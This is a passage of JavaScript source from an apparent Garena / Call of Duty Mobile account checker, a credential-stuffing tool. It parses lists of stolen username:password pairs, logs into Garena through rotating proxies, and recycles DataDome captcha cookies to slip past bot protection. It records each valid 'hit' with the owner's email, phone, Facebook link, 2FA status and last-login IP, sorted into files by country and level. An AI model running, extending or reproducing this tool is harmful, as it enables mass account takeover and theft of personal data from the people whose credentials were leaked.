            const prelogin_text_clean = strip_ansi_codes(String(response_prelogin.data));
            
            const newCookiesFromPrelogin = parseSetCookies(response_prelogin.headers['set-cookie']);
            datadome_from_prelogin_response = newCookiesFromPrelogin['datadome'] || null;


            if (detect_captcha_in_response(prelogin_text_clean)) {
                 logging.warning(`CAPTCHA DETECTED IN PRELOGIN RESPONSE BODY FOR ${username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN RESPONSE BODY)";
            }
            // Axios throws for non-2xx
        } catch (e) {
            const prelogin_text_clean_on_error = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
            if (e.response && e.response.status >= 400 && detect_captcha_in_response(prelogin_text_clean_on_error)) {
                 logging.warning(`CAPTCHA DETECTED IN PRELOGIN HTTP ERROR ${e.response.status} BODY FOR ${username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN HTTP ERROR BODY)";
            }

            if (e.code === 'ECONNABORTED') {
                logging.error(`PRELOGIN TIMED OUT FOR ${username}`);
                return "[⏱️] PRELOGIN TIMED OUT";
            }
            if (e.response) {
                 const status_code = e.response.status;
                 if (status_code === 403) return `[🚫] PRELOGIN FORBIDDEN (403)`;
                 if (status_code === 429) return "[🚦] PRELOGIN RATE LIMITED (429)";
                 logging.warning(`PRELOGIN HTTP ERROR ${status_code} FOR ${username}: ${strip_ansi_codes(String(e.response.data)).substring(0,200)}`);
                 return `[📉] PRELOGIN HTTP ERROR ${status_code}`;
            }
            const err_str = strip_ansi_codes(e.message);
            if (detect_captcha_in_response(err_str)) {
                 logging.warning(`CAPTCHA DETECTED DURING PRELOGIN REQUEST ERROR FOR ${username}: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN REQUEST ERROR)";
            }
            logging.error(`PRELOGIN REQUEST FAILED FOR ${username}: ${e.message}`);
            
            if (err_str.includes("SOCKSHTTPSConnectionPool") || err_str.includes("Proxy Authentication Required") || err_str.includes("Cannot connect to proxy") || err_str.includes("Connection refused")) {
                return `[🔌] PROXY CONNECTION ERROR: ${err_str.substring(0,100)}`;
            }
            return `[🔌] PRELOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
        }

        let data_prelogin;
        try {
            data_prelogin = (typeof response_prelogin.data === 'object') ? response_prelogin.data : json.parse(response_prelogin.data);
        } catch (jsonError) {
             logging.error(`INVALID PRELOGIN JSON FOR ${username}: ${String(response_prelogin.data).substring(0,200)}`);
             return `[🧩] INVALID PRELOGIN JSON`;
        }

        if (data_prelogin.error) {
            const error_msg = data_prelogin.error;
            logging.warning(`PRELOGIN ERROR FIELD FOR ${username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) {
                 return "[🤖] CAPTCHA REQUIRED (PRELOGIN ERROR FIELD)";
            }
            
            if (error_msg === 'error_account_does_not_exist') return "[👻] ACCOUNT DOESN'T EXIST";
            return `[❗] PRELOGIN ERROR: ${error_msg}`;
        }

        v1 = data_prelogin.v1;
        v2 = data_prelogin.v2;
        if (!v1 || !v2) {
            logging.error(`PRELOGIN DATA MISSING V1/V2 FOR ${username}: ${json.stringify(data_prelogin)}`);
            return "[⚠️] PRELOGIN DATA MISSING (V1/V2)";
        }

        encrypted_password_val = get_encrypted_password(password, v1, v2);
        
        let datadome_for_login_step = null;
        
        if (datadome_from_prelogin_response && typeof datadome_from_prelogin_response === 'string' &&
           !/^\[[🤖⚠️]\]/.test(datadome_from_prelogin_response)) {
            datadome_for_login_step = datadome_from_prelogin_response;
            save_datadome_to_storage(datadome_for_login_step);
        } else if (datadome_for_prelogin_attempt) {
            datadome_for_login_step = datadome_for_prelogin_attempt;
        }

        let login_step_cookies = { ...initial_cookies_from_system };
        if (response_prelogin && response_prelogin.headers['set-cookie']) {
            const newCookiesFromPreloginAgain = parseSetCookies(response_prelogin.headers['set-cookie']);
            for (const cookieName in newCookiesFromPreloginAgain) {
                if (cookieName !== 'datadome') { 
                    login_step_cookies[cookieName] = newCookiesFromPreloginAgain[cookieName];
                }
            }
        }
        
        const login_result = await check_login(
            username, random_id, // Pass random_id as _id
            encrypted_password_val,
            password,
            headers, 
            login_step_cookies,
            datadome_for_login_step, 
            date, proxies, timeout
        );
        return login_result;

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA DETECTED DURING UNEXPECTED ERROR IN check_account FOR ${username}.`);
            return "[🤖] CAPTCHA DETECTED (check_account UNEXPECTED)";
        }
        
        if (e instanceof ReferenceError && (e.message.includes('encrypted_password') || e.message.includes('encryptedpassword'))) {
            logging.critical(`CRITICAL LOGIC FLAW: PASSWORD ENCRYPTION VARIABLE NOT DEFINED BEFORE USE IN check_account FOR ${username}. ERROR: ${e.message}`, e);
            return "[💥] INTERNAL ERROR: PASSWORD ENCRYPTION STATE INVALID.";
        }
        logging.exception(`UNEXPECTED ERROR IN check_account FOR ${username}:`, e);
        return `[💥] UNEXPECTED ERROR IN check_account: ${err_str.substring(0,100)}`;
    }
}

function get_level_range_filename_part(level_int) {
    if (typeof level_int !== 'number' || isNaN(level_int) || level_int < 1) {
        return "UNKNOWN_LEVEL";
    }
    const group_interval = 20;
    const group_index = Math.floor((level_int - 1) / group_interval);
    const start_level = group_index * group_interval + 1;
    const end_level = start_level + group_interval - 1;
    return `${start_level}-${end_level}`;
}

function get_account_security_status_foldername(result_data) {
    const security_info = result_data.security || {};
    const email_verified = security_info.email_verified || false;
    const mobile_bound = security_info.mobile_bound || false;
    if (email_verified && mobile_bound) {
        return "clean";
    }
    return "not_clean";
}

function sanitize_filename(name_str) {
    if (!name_str || ["n/a", "none", "unknown"].includes(String(name_str).toLowerCase())) {
        return "UNKNOWN_VALUE";
    }
    name_str = String(name_str);
    name_str = name_str.replace(/[\\/*?:"<>|]/g, '_'); // Replace forbidden chars
    name_str = name_str.replace(/\s+/g, '_'); // Replace spaces with underscore
    name_str = name_str.substring(0, 50).replace(/(^[._-]+)|([._-]+$)/g, ''); // Trim special chars from ends
    
    if (!name_str) {
         return "UNKNOWN_VALUE_SANITIZED";
    }
    return name_str.toUpperCase();
}

function write_dynamic_result_to_file(filepath_to_write, content_to_write, headers_written_set) {
    try {
        fsExtra.ensureDirSync(path.dirname(filepath_to_write)); // fs-extra ensureDirSync
        const file_exists_before_open = fs.existsSync(filepath_to_write);
        
        if (!headers_written_set.has(filepath_to_write)) {
            if (!file_exists_before_open || fs.statSync(filepath_to_write).size === 0) {
                fs.appendFileSync(filepath_to_write, OUTPUT_FILE_HEADER.toUpperCase() + "\n", 'utf-8');
            }
            headers_written_set.add(filepath_to_write);
        }
        fs.appendFileSync(filepath_to_write, content_to_write, 'utf-8');
    } catch (e) {
        logging.error(`IOERROR WRITING TO DYNAMIC FILE ${filepath_to_write}: ${e.message}`);
        console.log(`${COLORS['RED']}IOERROR WRITING TO FILE ${path.basename(filepath_to_write)}: ${e.message}${COLORS['RESET']}`);
    }
}

function remove_url(line) { // Direct translation
    const pattern1 = /(?:https?:\/\/)?(?:[\w-]+\.)+[\w-]+(?:\/[^\s:]*)?[:\s]([^\s:]+:[^\s:]+)/;
    const match1 = pattern1.exec(line);
    if (match1) {
        return match1[1];
    }
    
    const pattern2 = /(?:[^:\s]+:[^:\s]+\s+)*([^:\s]+:[^:\s]+)/;
    const match2 = pattern2.exec(line);
    if (match2) {
        const potential_user_pass = match2[1];
        if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/.test(potential_user_pass)) {
            return potential_user_pass;
        }
    }
    
    if (line.includes(":") && line.split(':').length >= 2 && !line.startsWith("http") && !/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$/.test(line.split(':')[0])) {
        return line;
    }
        
    return null;
}

// Stub htmlEscape if 'he' module is problematic or for stricter adherence
function htmlEscape(text) {
    if (typeof text !== 'string') return text;
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}


async function bulk_check(filePath, initial_cookies_tuple_for_session, check_delay = 0, proxy_list_param = null, run_folder_name_param = null) {
    let failed_count = 0, codm_failed_count = 0, checked_count = 0;
    const level_summary_counts = {"UNKNOWN_LEVEL": 0};
    let total_accounts = 0;
    const main_output_files_handles = {};
    const generated_files_for_telegram = [];
    const headers_written_to_sorted_files = new Set();
    let proxy_list = proxy_list_param ? [...proxy_list_param] : null; // Use a mutable copy


    if (!filePath || !fs.existsSync(filePath) || !fs.statSync(filePath).isFile() || !filePath.endsWith('.txt')) {
        const errorMsg = `❌ ERROR: INVALID FILE PATH OR NOT A .TXT FILE: ${filePath}`;
        console.log(`${COLORS['RED']}${errorMsg}${COLORS['RESET']}`);
        logging.error(errorMsg); // Log this error
        // In an API, throw an error or return a specific error response
        throw new Error(errorMsg); 
    }

    const base_dir_for_all_checks = "S1N-CODM";
    fsExtra.ensureDirSync(base_dir_for_all_checks);

    const default_run_folder_name = `${path.basename(filePath, '.txt')}_RESULTS_${DateTime.now().toFormat('yyyyMMdd_HHmmss')}`;
    
    // In API, run_folder_name comes from request or defaults here
    const run_folder_name_input = run_folder_name_param || default_run_folder_name;
    let run_folder_name_sanitized = sanitize_filename(run_folder_name_input);
    if (!run_folder_name_sanitized || run_folder_name_sanitized === "UNKNOWN_VALUE") {
        run_folder_name_sanitized = sanitize_filename(default_run_folder_name);
    }
    const current_run_dir = path.join(base_dir_for_all_checks, run_folder_name_sanitized);
    fsExtra.ensureDirSync(current_run_dir);
    console.log(`${COLORS['GREY']}OUTPUT WILL BE SAVED IN: '${current_run_dir}'${COLORS['RESET']}`);
    logging.info(`Output will be saved in: '${current_run_dir}'`);


    const date_timestamp = get_current_timestamp();
    const main_file_paths = {
        'failed_general': path.join(current_run_dir, `${run_folder_name_sanitized}_FAILED_GENERAL.txt`),
        'failed_codm': path.join(current_run_dir, `${run_folder_name_sanitized}_FAILED_CODM.txt`),
        'successful_unsorted': path.join(current_run_dir, `@YISHUX_${run_folder_name_sanitized}_UNSORTED.txt`), // Corrected filename
    };

    let available_datadomes_for_retry_session = [];
    let current_proxy_selection_index = -1;
    let start_time; // Declare here to ensure it's in scope for finally

    try {
        for (const [key, fpath_val] of Object.entries(main_file_paths)) {
            let specific_header_line = "";
            if (key === 'failed_general') specific_header_line = "# GENERAL FAILED/ERROR ACCOUNTS | FORMAT: USER:PASS | REASON\n";
            else if (key === 'failed_codm') specific_header_line = "# CODM CHECK FAILED ACCOUNTS (GARENA LOGIN OK) | FORMAT: USER:PASS | REASON\n";
            else if (key === 'successful_unsorted') specific_header_line = "# ALL SUCCESSFUL ACCOUNTS (UNSORTED)\n";

            fs.writeFileSync(fpath_val, OUTPUT_FILE_HEADER.toUpperCase(), 'utf-8');
            if (specific_header_line) fs.appendFileSync(fpath_val, specific_header_line.toUpperCase(), 'utf-8');
            fs.appendFileSync(fpath_val, "\n", 'utf-8');
            main_output_files_handles[key] = fpath_val; 
        }
        
        const valid_accounts = [];
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        const lines = fileContent.split(/\r?\n/);

        lines.forEach((line_content_raw, line_num) => {
            const line_content = line_content_raw.trim();
            if (!line_content || line_content.startsWith('#')) {
                return; 
            }
            
            const extracted_credentials = remove_url(line_content);
            const line_to_parse = extracted_credentials ? extracted_credentials : line_content;
            
            let identifier, pword;
            const firstColonIndex = line_to_parse.indexOf(':');

            if (firstColonIndex > -1) {
                identifier = line_to_parse.substring(0, firstColonIndex).trim();
                pword = line_to_parse.substring(firstColonIndex + 1).trim();
            }

            if (identifier && pword) {
                valid_accounts.push([identifier, pword]);
            } else {
                logging.warning(`SKIPPING LINE ${line_num+1} (EMPTY USER/PASS AFTER PARSE): '${htmlEscape(line_content.substring(0,50))}'`);
            }
        });
        
        total_accounts = valid_accounts.length;
        if (total_accounts === 0) {
            console.log(`${COLORS['YELLOW']}⚠️ NO VALID ACCOUNTS FOUND IN ${path.basename(filePath)}.${COLORS['RESET']}`);
            logging.warning(`No valid accounts found in ${path.basename(filePath)}.`);
            return { 
                message: `No valid accounts found in ${path.basename(filePath)}.`,
                totalAccounts: 0,
                processed: 0,
                hits:0,
                codmFailed: 0,
                generalFailed: 0,
                outputDirectory: current_run_dir
            };
        }

        console.log(`${COLORS['CYAN']}📊 TOTAL VALID ACCOUNTS LOADED: ${total_accounts}${COLORS['RESET']}`);
        if (check_delay > 0) console.log(`${COLORS['CYAN']}   DELAY BETWEEN CHECKS: ${check_delay}S${COLORS['RESET']}`);
        const initial_proxy_count = proxy_list ? proxy_list.length : 0;
        if (proxy_list) console.log(`${COLORS['CYAN']}   USING PROXY: YES (${initial_proxy_count} PROXIES LOADED - ROTATING WITH RETRIES & REMOVAL)${COLORS['RESET']}`);
        else console.log(`${COLORS['CYAN']}   USING PROXY: NO${COLORS['RESET']}`);
        await time.sleep(1);

        start_time = time.time();
        let progress_line = "";
        let account_index = 0;
        
        while (account_index < total_accounts) {
            const [username, password_from_file] = valid_accounts[account_index];
            const current_check_index_display = checked_count + 1;
            let current_account_proxy_attempt_count = 0;
            let final_result_for_account = null;

            mainLoopRetry: 
            while (true) {
                let current_proxy_obj_for_axios = null; 
                let proxy_display_name = "NONE";
                let actual_proxy_url_for_check = null;
                let chosen_proxy_idx_for_removal = -1;

                if (proxy_list && proxy_list.length > 0) {
                    if (current_account_proxy_attempt_count === 0) { 
                        current_proxy_selection_index = (current_proxy_selection_index + 1) % proxy_list.length;
                        chosen_proxy_idx_for_removal = current_proxy_selection_index;
                    } else { 
                        chosen_proxy_idx_for_removal = random.randint(0, proxy_list.length - 1);
                    }
                    
                    actual_proxy_url_for_check = proxy_list[chosen_proxy_idx_for_removal];
                    current_proxy_obj_for_axios = { http: actual_proxy_url_for_check, https: actual_proxy_url_for_check };

                    let temp_proxy_display = actual_proxy_url_for_check.includes('@') ? actual_proxy_url_for_check.split('@')[1] : actual_proxy_url_for_check;
                    temp_proxy_display = temp_proxy_display.replace('http://','').replace('https://','');
                    proxy_display_name = `${temp_proxy_display.substring(0,20)} (${chosen_proxy_idx_for_removal+1}/${proxy_list.length})`;
                    if (current_account_proxy_attempt_count > 0) {
                        proxy_display_name += ` [RETRY ${current_account_proxy_attempt_count}]`;
                    }
                }
                
                const percentage = (current_check_index_display / total_accounts) * 100 || 0;
                const total_successful_hits = Object.values(level_summary_counts).reduce((s, c) => s + c, 0) - (level_summary_counts["UNKNOWN_LEVEL"] || 0);
                
                const prog_parts = [
                    `${COLORS['YELLOW']}🔍 [${current_check_index_display}/${total_accounts} | ${percentage.toFixed(1)}%]`,
                    `${COLORS['GREEN']}HITS: ${total_successful_hits}`, `${COLORS['MAGENTA']}CF: ${codm_failed_count}`,
                    `${COLORS['RED']}F: ${failed_count}`,
                ];
                if (current_proxy_obj_for_axios) prog_parts.push(`${COLORS['BLUE']}P: ${proxy_display_name.toUpperCase()}`);
                else prog_parts.push(`${COLORS['BLUE']}P: NONE`);
                prog_parts.push(`${COLORS['GREY']}NOW: ${htmlEscape(username.substring(0,15))}${'*'.repeat(password_from_file.length || 0)}${COLORS['RESET']}`);
                progress_line = prog_parts.join(" | ");
                
                const term_width = process.stdout.columns || 80;
                
                process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r");
                process.stdout.write(progress_line.substring(0, term_width -1));

                let datadome_retry_attempt_count = 0;
                let current_dd_for_prelogin_retry = null;
                
                while (datadome_retry_attempt_count <= MAX_DATADOME_RETRIES_FOR_ACCOUNT) {
                    final_result_for_account = await check_account(username, password_from_file, date_timestamp,
                                                      initial_cookies_tuple_for_session, 
                                                      current_proxy_obj_for_axios, 
                                                      current_dd_for_prelogin_retry,
                                                      REQUEST_TIMEOUT); 

                    const is_captcha_from_check = typeof final_result_for_account === 'string' && final_result_for_account.startsWith("[🤖] CAPTCHA");
                    if (!is_captcha_from_check) {
                        break; 
                    }

                    datadome_retry_attempt_count += 1;
                    if (datadome_retry_attempt_count <= MAX_DATADOME_RETRIES_FOR_ACCOUNT) {
                        process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r"); 
                        console.log(`${COLORS['YELLOW']}   ACCOUNT ${htmlEscape(username)}: RETRYING ACCOUNT ${datadome_retry_attempt_count}/${MAX_DATADOME_RETRIES_FOR_ACCOUNT} ON PROXY/IP ${proxy_display_name.toUpperCase()})${COLORS['RESET']}`);

                        if (available_datadomes_for_retry_session.length === 0) {
                            available_datadomes_for_retry_session = load_datadomes_from_storage();
                            random.shuffle(available_datadomes_for_retry_session);
                        }
                        if (available_datadomes_for_retry_session.length > 0) {
                            current_dd_for_prelogin_retry = available_datadomes_for_retry_session.pop();
                        } else {
                            const new_dd = await get_datadome_cookie(current_proxy_obj_for_axios, REQUEST_TIMEOUT);
                            if (new_dd && !/^\[[🤖⚠️⏱️🔴]\]/.test(new_dd)) {
                                current_dd_for_prelogin_retry = new_dd;
                            } else {
                                logging.warning(`Failed to get a new datadome for retry (${username}). Error: ${new_dd}`);
                                if (typeof new_dd === 'string' && RETRYABLE_PROXY_ERROR_PREFIXES.some(p => new_dd.startsWith(p))) {
                                    final_result_for_account = new_dd; 
                                }
                                break; 
                            }
                        }
                        await time.sleep(1.5);
                        process.stdout.write(progress_line); 
                    } else {
                        logging.warning(`ACCOUNT ${username} STILL CAPTCHA AFTER ${MAX_DATADOME_RETRIES_FOR_ACCOUNT} DATADOME RETRIES (ON PROXY/IP: ${proxy_display_name}).`);
                        break; 
                    }
                } 
                
                available_datadomes_for_retry_session = []; 
                process.stdout.write("\r" + " ".repeat(strip_ansi_codes(progress_line).length + 5) + "\r"); 

                let is_retryable_error_type = false;
                if (typeof final_result_for_account === 'string') {
                    for (const prefix of RETRYABLE_PROXY_ERROR_PREFIXES) {
                        if (final_result_for_account.toUpperCase().startsWith(prefix)) {
                            is_retryable_error_type = true;
                            break;
                        }
                    }
                }
                
                if (is_retryable_error_type) {
                    if (current_proxy_obj_for_axios && actual_proxy_url_for_check && proxy_list && proxy_list.length > 0) {
                        logging.warning(`Account ${username} got retryable error '${final_result_for_account}' with proxy ${actual_proxy_url_for_check}. Removing this proxy.`);
                        console.log(`\n${COLORS['YELLOW']}   Proxy ${proxy_display_name.split(' [RETRY')[0]} failed: '${final_result_for_account}'. Removing it.${COLORS['RESET']}`);
                        
                        if (chosen_proxy_idx_for_removal >= 0 && chosen_proxy_idx_for_removal < proxy_list.length) {
                            const removed_proxy_url = proxy_list.splice(chosen_proxy_idx_for_removal, 1)[0];
                            if (chosen_proxy_idx_for_removal <= current_proxy_selection_index) {
                                current_proxy_selection_index = Math.max(-1, current_proxy_selection_index - 1);
                            }
                            logging.info(`Removed proxy ${removed_proxy_url}. ${proxy_list.length} proxies remaining.`);
                        } else {
                             logging.warning(`Tried to remove proxy at invalid index ${chosen_proxy_idx_for_removal}. Proxy list length: ${proxy_list.length}`);
                        }
                        
                        if (proxy_list.length === 0) {
                            console.log(`${COLORS['RED']}   All proxies have been exhausted/removed!${COLORS['RESET']}`);
                            proxy_list = null; 
                        }
                        
                        current_account_proxy_attempt_count += 1;
                        if (current_account_proxy_attempt_count < PROXY_RETRY_LIMIT && proxy_list && proxy_list.length > 0) {
                            console.log(`${COLORS['YELLOW']}   Retrying account ${htmlEscape(username)} with a new proxy (Account Attempt ${current_account_proxy_attempt_count + 1}/${PROXY_RETRY_LIMIT})...${COLORS['RESET']}`);
                            await time.sleep(1.5);
                            continue mainLoopRetry; 
                        } else {
                            if (!(proxy_list && proxy_list.length > 0) && current_account_proxy_attempt_count < PROXY_RETRY_LIMIT) {
                                final_result_for_account = `[PROXY EXHAUSTED] Last error for ${username}: ${final_result_for_account}`;
                            } else { 
                                final_result_for_account = `[MAX PROXY ATTEMPTS FOR ACCOUNT] Last error for ${username}: ${final_result_for_account}`;
                            }
                        }
                    } else { 
                        console.log(`\n${COLORS['RED_BG']}${COLORS['WHITE']} ✋ CAPTCHA/ERROR! ${COLORS['RESET']}`);
                        console.log(`${COLORS['RED']}   ACCOUNT: ${htmlEscape(username)}:${password_from_file}`);
                        console.log(`${COLORS['RED']}   REASON: ${htmlEscape(final_result_for_account)}`);
                        console.log(`${COLORS['RED']}   PROXIES NOT CURRENTLY IN USE OR ENABLED.${COLORS['RESET']}`);
                        const action_needed = "CHANGE YOUR IP (E.G., RESTART VPN/ROUTER)";
                        console.log(`${COLORS['YELLOW']}   🔒 ISSUE DETECTED. PLEASE ${action_needed.toUpperCase()}.${COLORS['RESET']}`);
                        logging.warning(`CAPTCHA/ERROR for ${username} without proxy. Original script would pause. API will fail this account.`);
                    }
                }
                
                if (typeof final_result_for_account === 'object' && final_result_for_account !== null && !Array.isArray(final_result_for_account)) {
                    const codm_level_int = (final_result_for_account.codm_details || {}).level;
                    const level_range_base = get_level_range_filename_part(codm_level_int);
                    level_summary_counts[level_range_base] = (level_summary_counts[level_range_base] || 0) + 1;
                    
                    const garena_status = final_result_for_account.account_status_garena || "N/A";
                    const shells = final_result_for_account.garena_shells || 0;
                    const codm_details = final_result_for_account.codm_details || {};
                    const codm_status = codm_details.status || "N/A";
                    const codm_nick = codm_details.nickname;
                    const codm_region = codm_details.region;
                    const checker_by_credit = final_result_for_account.checker_by || "N/A";

                    let cli_lines = [
                        `${COLORS['GREEN']}✅ [${current_check_index_display}/${total_accounts}] VALID ACCOUNT`,
                        `${COLORS['WHITE']}   CREDS: ${COLORS['CYAN']}${htmlEscape(username)}:${password_from_file}`,
                        `${COLORS['WHITE']}   GARENA STATUS: ${COLORS['YELLOW']}${htmlEscape(garena_status).toUpperCase()}`,
                        `${COLORS['WHITE']}   SHELLS: ${COLORS['MAGENTA']}${shells}`,
                    ];
                    if (codm_status.toUpperCase() === "LINKED") {
                        cli_lines.push(`${COLORS['BLUE_BOLD']}   🎮 CODM: ${COLORS['CYAN']}${htmlEscape(codm_nick || 'N/A')}`
                                         + `${COLORS['WHITE']} | LVL: ${COLORS['CYAN']}${codm_level_int !== null ? codm_level_int : 'N/A'}`
                                         + `${COLORS['WHITE']} | REGION: ${COLORS['CYAN']}${htmlEscape(codm_region || 'N/A')}`);
                    } else if (codm_status.toUpperCase() !== "NO CODM INFO PARSED") {
                        cli_lines.push(`${COLORS['WHITE']}   🎮 CODM STATUS: ${COLORS['GREY']}${htmlEscape(codm_status).toUpperCase()}`);
                    }
                    const sec = final_result_for_account.security || {}; 
                    const bindings = final_result_for_account.bindings || {};
                    const sec_info_cli = [];
                    if (bindings.email_address) sec_info_cli.push(`${COLORS['GREEN']}EMAIL${(sec.email_verified ? '✔️' : '❌')}${COLORS['RESET']}`);
                    else sec_info_cli.push(`${COLORS['GREY']}EMAIL-${COLORS['RESET']}`);
                    if (bindings.mobile_number) sec_info_cli.push(`${COLORS['GREEN']}PHONE✔️${COLORS['RESET']}`);
                    else sec_info_cli.push(`${COLORS['GREY']}PHONE-${COLORS['RESET']}`);
                    if (bindings.facebook_name) sec_info_cli.push(`${COLORS['BLUE']}FB✔️${COLORS['RESET']}`);
                    else sec_info_cli.push(`${COLORS['GREY']}FB-${COLORS['RESET']}`);
                    if (sec.google_authenticator_enabled) sec_info_cli.push(`${COLORS['YELLOW']}AUTH✔️${COLORS['RESET']}`);
                    if (sec.two_step_verification_enabled) sec_info_cli.push(`${COLORS['RED']}2FA✔️${COLORS['RESET']}`);
                    cli_lines.push(`${COLORS['WHITE']}   SEC: ${sec_info_cli.join('/')}`);
                    const last_login_info = final_result_for_account.last_login_time || 'N/A';
                    if (last_login_info && last_login_info !== 'N/A') {
                        const last_login_loc = final_result_for_account.last_login_location || 'N/A';
                        cli_lines.push(`${COLORS['WHITE']}   LAST LOGIN: ${COLORS['CYAN']}${last_login_info} (${last_login_loc})${COLORS['RESET']}`);
                    }
                    cli_lines.push(`${COLORS['WHITE']}   CHECKED BY: ${COLORS['CYAN']}${checker_by_credit}${COLORS['RESET']}`);
                    console.log("\n" + cli_lines.join("\n")); 

                    const L1NK = (final_result_for_account.bindings || {}).facebook_link;
                    const file_lines_content_parts = [
                        `✔️ VALID ACCOUNT\n`,
                        ` - CREDENTIALS: ${username}:${password_from_file}`,
                        ` - CHECKED BY: ${checker_by_credit}`,
                        ` - GARENA ACCOUNT STATUS: ${garena_status.toUpperCase()}`,
                        ` - COUNTRY: ${final_result_for_account.account_country || 'N/A'}`,
                        ` - SHELLS: ${shells}`,
                        ` - LAST LOGIN: ${final_result_for_account.last_login_time || 'N/A'} (LOCATION: ${final_result_for_account.last_login_location || 'N/A'}, IP: ${final_result_for_account.last_login_ip || 'N/A'})`,
                        `\n🔗 BINDINGS:`,
                        ` - MOBILE NUMBER: ${bindings.mobile_number || 'NOT BOUND'}`,
                        ` - EMAIL ADDRESS: ${bindings.email_address || 'NOT BOUND'} (VERIFIED: ${sec.email_verified || false})`,
                        ` - FACEBOOK ACCOUNT: ${bindings.facebook_name || 'NOT LINKED'}`,
                        ` - FACEBOOK LINK: ${L1NK || 'N/A'}`,
                        `\n🚨 SECURITY DETAILS:`,
                        ` - GOOGLE AUTHENTICATOR ENABLED: ${sec.google_authenticator_enabled || false}`,
                        ` - TWO-STEP (2FA) VERIFICATION ENABLED: ${sec.two_step_verification_enabled || false}`
                    ];
                    if (codm_status.toUpperCase() === "LINKED") {
                        file_lines_content_parts.push(`\n🎮 CODM DETAILS:`, ` - NICKNAME: ${codm_nick || 'N/A'}`,
                                         ` - LEVEL: ${codm_level_int !== null ? codm_level_int : 'N/A'}`,
                                         ` - REGION: ${codm_region || 'N/A'}`,
                                         ` - UID: ${codm_details.uid || 'N/A'}`);
                    } else { file_lines_content_parts.push(`\n🎮 CODM STATUS:\n - ${codm_status.toUpperCase()}`); }
                    file_lines_content_parts.push("\n" + "—".repeat(40) + "\n");
                    const full_content_for_file = file_lines_content_parts.join("\n");
                    
                    fs.appendFileSync(main_output_files_handles['successful_unsorted'], full_content_for_file, 'utf-8');

                    const garena_status_val = get_account_security_status_foldername(final_result_for_account);
                    const garena_status_dir = path.join(current_run_dir, "account_status");
                    const path_garena_status_file = path.join(garena_status_dir, `${garena_status_val}.txt`);
                    write_dynamic_result_to_file(path_garena_status_file, full_content_for_file, headers_written_to_sorted_files);
                    
                    const country_from_result = final_result_for_account.account_country || 'UNKNOWN_COUNTRY';
                    const country_filename_part = sanitize_filename(country_from_result);
                    const account_country_dir = path.join(current_run_dir, "account_country");
                    const path_account_country_file = path.join(account_country_dir, `${country_filename_part}.txt`);
                    write_dynamic_result_to_file(path_account_country_file, full_content_for_file, headers_written_to_sorted_files);

                    const level_range_filename_val = `${level_range_base}.txt`;
                    const account_levels_dir = path.join(current_run_dir, "account_levels");
                    const path_account_level_file = path.join(account_levels_dir, level_range_filename_val);
                    write_dynamic_result_to_file(path_account_level_file, full_content_for_file, headers_written_to_sorted_files);

                    const hits_dir = path.join(current_run_dir, "hits");
                    const hits_filename = "@yishux_codm-hits.txt"; 
                    const path_hits_file = path.join(hits_dir, hits_filename);
                    
                    const data_for_hit_line = final_result_for_account;
                    const identifier_part = `${username}:${password_from_file}`;
                    const hit_details = [];
                    const add_detail = (key_display, value, to_upper = true) => {
                        let val_str = (value === null || typeof value === 'undefined') ? "N/A" : String(value);
                        if (to_upper && val_str !== "N/A") val_str = val_str.toUpperCase();
                        hit_details.push(`${key_display}: ${val_str}`);
                    };

                    add_detail("acc_status", data_for_hit_line.account_status_garena);
                    add_detail("country", data_for_hit_line.account_country);
                    add_detail("shells", data_for_hit_line.garena_shells, false);
                    const ll_time = data_for_hit_line.last_login_time;
                    const ll_loc = data_for_hit_line.last_login_location;
                    const ll_ip = data_for_hit_line.last_login_ip;
                    const last_login_str_val = `${ll_time || 'N/A'} (LOC: ${ll_loc || 'N/A'}, IP: ${ll_ip || 'N/A'})`;
                    add_detail("last_login", last_login_str_val, false);
                    
                    const bindings_data_hit = data_for_hit_line.bindings || {};
                    add_detail("mobile", bindings_data_hit.mobile_number, false);
                    add_detail("fb_name", bindings_data_hit.facebook_name, false);
                    add_detail("fb_link", bindings_data_hit.facebook_link, false);

                    const security_data_hit = data_for_hit_line.security || {};
                    add_detail("email_verified", security_data_hit.email_verified);
                    add_detail("mobile_bound", security_data_hit.mobile_bound);
                    add_detail("fb_linked", security_data_hit.facebook_linked);
                    add_detail("google_auth", security_data_hit.google_authenticator_enabled);
                    add_detail("2fa_enabled", security_data_hit.two_step_verification_enabled);

                    const codm_data_hit = data_for_hit_line.codm_details || {};
                    const codm_status_val_hit = codm_data_hit.status;
                    add_detail("codm_status", codm_status_val_hit);
                    if (codm_status_val_hit && codm_status_val_hit.toUpperCase() === "LINKED") {
                        add_detail("codm_nick", codm_data_hit.nickname, false);
                        add_detail("codm_lvl", codm_data_hit.level, false);
                        add_detail("codm_region", codm_data_hit.region);
                        add_detail("codm_uid", codm_data_hit.uid, false);
                    }
                    add_detail("ckz", data_for_hit_line.ckz_count, false);
                    add_detail("avatar", data_for_hit_line.avatar_url, false);
                    add_detail("checked_by", data_for_hit_line.checker_by, false);
                    
                    const full_hit_line_content = identifier_part + " | " + hit_details.join(" | ") + "\n";
                    write_dynamic_result_to_file(path_hits_file, full_hit_line_content, headers_written_to_sorted_files);

                } else if (Array.isArray(final_result_for_account) && final_result_for_account[0] === "CODM_FAILURE") {
                    codm_failed_count += 1;
                    const [, fail_user, fail_pass, fail_reason] = final_result_for_account;
                    const fail_reason_clean = strip_ansi_codes(fail_reason);
                    fs.appendFileSync(main_output_files_handles['failed_codm'], `${fail_user}:${fail_pass} | ${fail_reason_clean.toUpperCase()}\n`, 'utf-8');
